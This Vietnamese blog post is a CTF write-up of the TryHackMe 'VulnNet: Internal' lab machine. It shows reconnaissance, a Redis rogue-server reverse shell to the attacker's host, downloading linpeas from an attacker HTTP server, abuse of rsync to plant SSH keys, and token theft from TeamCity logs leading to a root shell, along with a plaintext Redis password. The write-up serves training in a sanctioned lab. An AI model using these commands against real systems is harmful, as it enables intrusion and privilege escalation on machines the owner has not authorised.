---
layout: post
author: "Neo"
title: "Tryhackme - VulnNet: Internal"
date: "2022-04-08"
tags: [
  "tryhackme",
  "smb",
  "linux",
	"mount",
	"redis",
	"rsync",
	"TeamCity",
  "ssh",
  "ssh-key"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-04-08-THM-VulnNet-Internal/1.webp)

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | VulnNet: Internal](https://tryhackme.com/room/vulnnetinternal)
## Reconnaissance

Vẫn như thông thường, việc đầu tiên cần làm quét các cổng đang mở trên máy chủ mục tiêu.

```python
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
|   256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38730/udp6  mountd
|   100005  1,2,3      40715/tcp6  mountd
|   100005  1,2,3      49113/tcp   mountd
|   100005  1,2,3      51452/udp   mountd
|   100021  1,3,4      42359/tcp6  nlockmgr
|   100021  1,3,4      43398/udp6  nlockmgr
|   100021  1,3,4      43415/tcp   nlockmgr
|   100021  1,3,4      49938/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       syn-ack (protocol version 31)
2049/tcp  open  nfs_acl     syn-ack 3 (RPC #100227)
6379/tcp  open  redis       syn-ack Redis key-value store
43415/tcp open  nlockmgr    syn-ack 1-4 (RPC #100021)
49113/tcp open  mountd      syn-ack 1-3 (RPC #100005)
51197/tcp open  mountd      syn-ack 1-3 (RPC #100005)
60935/tcp open  mountd      syn-ack 1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-11-23T02:16:00
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 23538/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60791/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27828/udp): CLEAN (Failed to receive data)
|   Check 4 (port 56651/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-11-23T03:16:00+01:00
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
```

Tôi sẽ bắt đầu với smb - port 139, 445. Đầu tiên kiểm tra share folders

```python
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.118.210
[+] Guest session       IP: 10.10.118.210:445   Name: 10.10.118.210                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        shares                                                  READ ONLY       VulnNet Business Shares
        IPC$                                                    NO ACCESS       IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

Truy cập vào thư mục *shares*

```python
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.118.210\\shares
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3279224 blocks available
smb: \> cd temp
smb: \temp\> dir
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021

                11309648 blocks of size 1024. 3279684 blocks available
smb: \temp\> get services.txt /home/kali/
Error opening local file /home/kali/           
smb: \temp\> scopy services.txt /home/kali/
Failed to create file \temp\home\kali\. NT_STATUS_OBJECT_PATH_NOT_FOUND
smb: \temp\> get services.txt 
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \temp\> 
smb: \temp\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3277876 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3277852 blocks available
smb: \data\> get data.txt 
getting file \data\data.txt of size 48 as data.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \data\> get business-req.txt 
getting file \data\business-req.txt of size 190 as business-req.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> 
```

Mở file *services.txt* trên máy local tôi sẽ có được flag đầu tiên. 

Với 2 file còn lại tôi được 2 lời nhắn

```python
┌──(kali㉿kali)-[~]
└─$ cat data.txt  
Purge regularly data that is not needed anymore
                                  
┌──(kali㉿kali)-[~]
└─$ cat business-req.txt 
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
                                     
┌──(kali㉿kali)-[~]
└─$ 

```

Không còn gì để khai thác với 2 port này, tôi sẽ chuyển sang `mount`

## RCE

```python
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.116.142                                           
Export list for 10.10.116.142:
/opt/conf *
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.10.116.142:/opt/conf /home/kali/THM-Vulnet -o nolock
┌──(kali㉿kali)-[~]
└─$ tree THM-Vulnet 
THM-Vulnet
├── hp
│   └── hplip.conf
├── init
│   ├── anacron.conf
│   ├── lightdm.conf
│   └── whoopsie.conf
├── opt
├── profile.d
│   ├── bash_completion.sh
│   ├── cedilla-portuguese.sh
│   ├── input-method-config.sh
│   └── vte-2.91.sh
├── redis
│   └── redis.conf
├── vim
│   ├── vimrc
│   └── vimrc.tiny
└── wildmidi
    └── wildmidi.cfg

7 directories, 12 files
                                     
┌──(kali㉿kali)-[~]
└─$ 
```

Tôi sẽ tập trung phân tích *redis* trước vì tôi thấy có service ở phía trên, có thể khai thác được gì đó, cái gì đó ở đây có thể password để truy cập vào service này. Tôi thử tìm "pass" và đã có kết quả

![pass-redis](/assets/img/2022-04-08-THM-VulnNet-Internal/2.webp)

Bây giờ thì thử tìm kiếm các cách khai thác với *redis*

[6379 - Pentesting Redis - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

Sử dụng [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) để tạo RCE

```python
┌──(kali㉿kali)-[~/redis-rogue-server]
└─$ python redis-rogue-server.py --rhost 10.10.116.142 --lhost 10.6.0.191 --lport 2402 --passwd B65Hx562F@ggAZ@F
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 10.10.116.142:6379
[info] SERVER 10.6.0.191:2402
[info] Setting master...
[info] Authenticating...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address:
```

Đến bước này, trước khi nhập address, tôi sẽ tạo listener với port 9001

`nc -lnvp 9001`

Sau đó thì nhập IP và port của máy local của tôi

```python
Reverse server address: 10.6.0.191
Reverse server port: 9001
[info] Reverse shell payload sent.
[info] Check at 10.6.0.191:9001
[info] Unload module...
```

Quay trở lại listener

```python
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.6.0.191] from (UNKNOWN) [10.10.116.142] 53768
id
uid=112(redis) gid=123(redis) groups=123(redis)
```

## User flag

Để đỡ mất thời gian thì tôi quyết định tải [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) lên machine.

Tạo local http server ở thư mục chứa file `linpeas.sh`

```python
┌──(kali㉿kali)-[~]
└─$ python -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Thư mục */tmp* có toàn quyền thực thi nên tôi sẽ tải file lên thư mục này, thay đổi quyền và chạy nó

```python
redis@vulnnet-internal:/$ cd tmp
cd tmp
redis@vulnnet-internal:/tmp$ wget http://10.6.0.191:9001/linpeas.sh
wget http://10.6.0.191:9001/linpeas.sh
--2022-11-23 09:04:33--  http://10.6.0.191:9001/linpeas.sh
Connecting to 10.6.0.191:9001... 
connected.
HTTP request sent, awaiting response... 
200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 808.42K   355KB/s    in 2.3s    

2022-11-23 09:04:36 (355 KB/s) - 'linpeas.sh' saved [827827/827827]

redis@vulnnet-internal:/tmp$ 
redis@vulnnet-internal:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
redis@vulnnet-internal:/tmp$ ./linpeas.sh
```

Quay lại 1 chút thông tin về máy này thì ở phần hint của flag thứ 2 chỉ ra rằng flag nằm trong 1 file db. Sau khi *linpeas* chạy xong thì tôi để ý thấy có 1 file rdb bên trong *redis*

```python
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                            
  Group redis:                                                                                                                                                                               
/tmp/linpeas.sh                                                                                                                                                                              
/run/redis/redis-server.pid
/var/log/redis/redis-server.log.1.gz
/var/log/redis/redis-server.log
/var/lib/redis/dump.rdb
```

Mở file này thì tôi có flag thứ 2 và 1 public key

Tuy nhiên cũng ở file này, tôi để ý thấy có 1 đoạn code khá lạ, có thể là base64

![code](/assets/img/2022-04-08-THM-VulnNet-Internal/3.webp)

Sau 1 lúc thử cho đúng format của đoạn code này thì tôi đã decrypt được 

Nó ở [đây](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=UVhWMGFHOXlhWHBoZEdsdmJpQm1iM0lnY25ONWJtTTZMeTl5YzNsdVl5MWpiMjV1WldOMFFERXlOeTR3TGpBdU1TQjNhWFJvSUhCaGMzTjNiM0prSUVoalp6TklVRFkzUUZSWFFFSmpOekoyQ2c9)

Nhớ rằng bên trên cũng có rsync với port 873. Tôi quay trở lại Book Hacktrick để tìm cách khai thác.

Sử dụng `metasploit` tôi tìm được file share là *files*

```python
msf6 auxiliary(scanner/rsync/modules_list) > run

[+] 10.10.116.142:873     - 1 rsync modules found: files
[*] 10.10.116.142:873     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/rsync/modules_list) > 
```

Bây giờ thử `rsync` như hướng dẫn, thử với password vừa tìm được ở *CyberChef* phía trên

```python
┌──(kali㉿kali)-[~]
└─$ rsync -av --list-only rsync://rsync-connect@10.10.116.142/files
```

Nó list ra tất cả các file có trong thư mục share này, tất nhiên là quá dài nên tôi sẽ không ghi vào đây. Để đọc được các file này, tôi phải clone nó về máy local 

```python
┌──(kali㉿kali)-[~]
└─$ rsync -av rsync://rsync-connect@10.10.116.142/files /home/kali/rsync 
```

Quay lại máy local

```python
┌──(kali㉿kali)-[~/rsync/sys-internal]
└─$ ll
total 36
drwx------ 2 kali kali 4096 Feb  1  2021 Desktop
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 Documents
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 Downloads
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 Music
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 Pictures
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 Public
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 Templates
-rw------- 1 kali kali   38 Feb  6  2021 user.txt
drwxr-xr-x 2 kali kali 4096 Feb  1  2021 Videos
```

Vậy là tôi tìm được *user-flag*

## Privilege escalation

Quay trở lại phần list file ở phía trên để xem cho dễ, tôi nhận ra có thư mục *.ssh*, nhưng bên trong không có gì.

Vậy thì tôi sẽ thử tải public key của mình lên máy để login ssh

```python
┌──(kali㉿kali)-[~/rsync]
└─$ cp ~/.ssh/id_rsa.pub authorized_keys
                                         
┌──(kali㉿kali)-[~/rsync]
└─$ rsync authorized_keys rsync://rsync-connect@10.10.116.142/files/sys-internal/.ssh   
Password: 
```

### SSH

```python
┌──(kali㉿kali)-[~/rsync]
└─$ ssh sys-internal@10.10.116.142    
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
```

Tuy nhiên sau khi dạo quanh 1 vòng tôi cũng không tìm được gì quá đặc biệt. Mất 1 lúc khá lâu để ngồi xem lại từ đầu xem tôi có bỏ sót gì không, quay ngược lại RCE ban đầu tôi nhận ra còn 1 thư mục khá thú vị mà tôi đã bỏ qua đó là TeamCity

```python
redis@vulnnet-internal:/$ ls -la
ls -la
total 533816
drwxr-xr-x  24 root root      4096 Feb  6  2021 .
drwxr-xr-x  24 root root      4096 Feb  6  2021 ..
drwx------   2 root root      4096 Feb  1  2021 .cache
drwxr-xr-x  12 root root      4096 Feb  6  2021 TeamCity
drwxr-xr-x   2 root root      4096 Feb  2  2021 bin
drwxr-xr-x   3 root root      4096 Feb  1  2021 boot
drwxr-xr-x   6 root root       380 Nov 23 07:20 dev
drwxr-xr-x 129 root root     12288 Feb  7  2021 etc
d---------   2 root root        40 Nov 23 07:20 home
lrwxrwxrwx   1 root root        34 Feb  1  2021 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root        33 Feb  1  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
drwxr-xr-x  18 root root      4096 Feb  1  2021 lib
drwxr-xr-x   2 root root      4096 Feb  1  2021 lib64
drwx------   2 root root     16384 Feb  1  2021 lost+found
drwxr-xr-x   4 root root      4096 Feb  2  2021 media
drwxr-xr-x   2 root root      4096 Feb  1  2021 mnt
drwxr-xr-x   4 root root      4096 Feb  2  2021 opt
dr-xr-xr-x 133 root root         0 Nov 23 07:20 proc
d---------   2 root root        40 Nov 23 07:20 root
drwxr-xr-x  27 root root       860 Nov 23 07:25 run
drwxr-xr-x   2 root root      4096 Feb  2  2021 sbin
drwxr-xr-x   2 root root      4096 Feb  1  2021 srv
-rw-------   1 root root 546529280 Feb  1  2021 swapfile
dr-xr-xr-x  13 root root         0 Nov 23 08:50 sys
drwxrwxrwt   2 root root      4096 Nov 23 09:05 tmp
drwxr-xr-x  10 root root      4096 Feb  1  2021 usr
drwxr-xr-x  13 root root      4096 Feb  1  2021 var
lrwxrwxrwx   1 root root        31 Feb  1  2021 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root        30 Feb  1  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-20-generic
```

Đây là 1 phần mềm giúp thiết lập máy chủ cho các dự án cũng như tích hợp các công cụ để phát triển dự án 

Thằng này có cổng mặc định là 8111, và khi kiểm tra các service đang chạy trên đây thì tôi cũng thấy có 8111

```python
redis@vulnnet-internal:/$ ss -ltp
ss -ltp
Cannot open netlink socket: Address family not supported by protocol
State  Recv-Q  Send-Q         Local Address:Port             Peer Address:Port                                                                                  
LISTEN 0       0                    0.0.0.0:45863                 0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:rsync                 0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:netbios-ssn           0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:6379                  0.0.0.0:*      users:(("ss",pid=19207,fd=6),("bash",pid=2072,fd=6),("python",pid=2071,fd=6),("sh",pid=538,fd=6))
LISTEN 0       0                    0.0.0.0:36171                 0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:sunrpc                0.0.0.0:*                                                                                     
LISTEN 0       0                 127.0.0.53:domain                0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:ssh                   0.0.0.0:*                                                                                     
LISTEN 0       0                  127.0.0.1:ipp                   0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:microsoft-ds          0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:nfs                   0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:36545                 0.0.0.0:*                                                                                     
LISTEN 0       0                    0.0.0.0:47331                 0.0.0.0:*                                                                                     
LISTEN 0       0         [::ffff:127.0.0.1]:56551                       *:*                                                                                     
LISTEN 0       0         [::ffff:127.0.0.1]:8105                        *:*                                                                                     
LISTEN 0       0                          *:rsync                       *:*                                                                                     
LISTEN 0       0                      [::1]:6379                        *:*      users:(("ss",pid=19207,fd=7),("bash",pid=2072,fd=7),("python",pid=2071,fd=7),("sh",pid=538,fd=7))
LISTEN 0       0                          *:34283                       *:*                                                                                     
LISTEN 0       0                          *:netbios-ssn                 *:*                                                                                     
LISTEN 0       0                          *:55021                       *:*                                                                                     
LISTEN 0       0         [::ffff:127.0.0.1]:8111                        *:*                                                                                     
LISTEN 0       0                          *:sunrpc                      *:*                                                                                     
LISTEN 0       0                          *:36497                       *:*                                                                                     
LISTEN 0       0                          *:43635                       *:*                                                                                     
LISTEN 0       0                          *:ssh                         *:*                                                                                     
LISTEN 0       0                      [::1]:ipp                         *:*                                                                                     
LISTEN 0       0                          *:microsoft-ds                *:*                                                                                     
LISTEN 0       0                          *:nfs                         *:*                                                                                     
LISTEN 0       0                          *:9090                        *:*                                                                                     
LISTEN 0       0                          *:37411                       *:*  
```

Sử dụng SSH để chuyển tiếp kết nối với port 8111

```python
┌──(kali㉿kali)-[~]
└─$ ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.116.142
bind [127.0.0.1]:8111: Address already in use
channel_setup_fwd_listener_tcpip: cannot listen to port: 8111
Could not request local forwarding.
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

541 packages can be updated.
342 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Nov 23 11:25:55 2022 from 10.6.0.191
sys-internal@vulnnet-internal:~$ 
```

Truy cập `127.0.0.1:8111`

![web](/assets/img/2022-04-08-THM-VulnNet-Internal/4.webp)

Vào *as a Super user*:

![super-user](/assets/img/2022-04-08-THM-VulnNet-Internal/5.webp)

Điều này có nghĩa là tôi cần token để login. Và việc đầu tiên tôi nghĩ đến là tìm nó bên trong log, vì có thể những phiên đăng nhập trước đó vẫn còn ghi lại trong log.

Tìm từ khóa *token* bên trong tất cả các file tại thư mục */logs*

```python
sys-internal@vulnnet-internal:/TeamCity$ grep -iR token /TeamCity/logs/ 2>/dev/null
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 1189775395164371106 (use empty username with the token as the password to access the server)
```

Với token cuối cùng thì tôi đã tìm đăng nhập thành công. Hiện tại tôi đang truy cập với *root*, có nghĩa là tôi có thể toàn quyền sử dụng TeamCity và sẽ tìm cách để RCE

Sau khi mất 1 thời gian tương đối để tìm hiểu thêm về TeamCity, tôi đã tìm được cách lấy RCE. Đầu tiên vẫn phải tạo 1 project mới, sau đó chọn *Buil Step* với command line và nhập payload vào *Custom script*, nó sẽ giống như thế này

![RCE](/assets/img/2022-04-08-THM-VulnNet-Internal/6.webp)

Sau đó save nó lại. Tiếp theo tạo listener với port đã thêm trong payload, ở đây tôi dùng port 9001

`nc -lnvp 9001`

Sau khi đã save xong, tôi chọn *Run* ở cửa sổ tiếp theo 

![run](/assets/img/2022-04-08-THM-VulnNet-Internal/7.webp)

Quay trở lại listener

```python
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.6.0.191] from (UNKNOWN) [10.10.211.50] 49704
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# id   
id
uid=0(root) gid=0(root) groups=0(root)
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# 
root@vulnnet-internal:/TeamCity/buildAgent/work/2b35ac7e0452d98f# cd
cd
root@vulnnet-internal:~# ls /root
ls /root
root.txt
root@vulnnet-internal:~# 
```
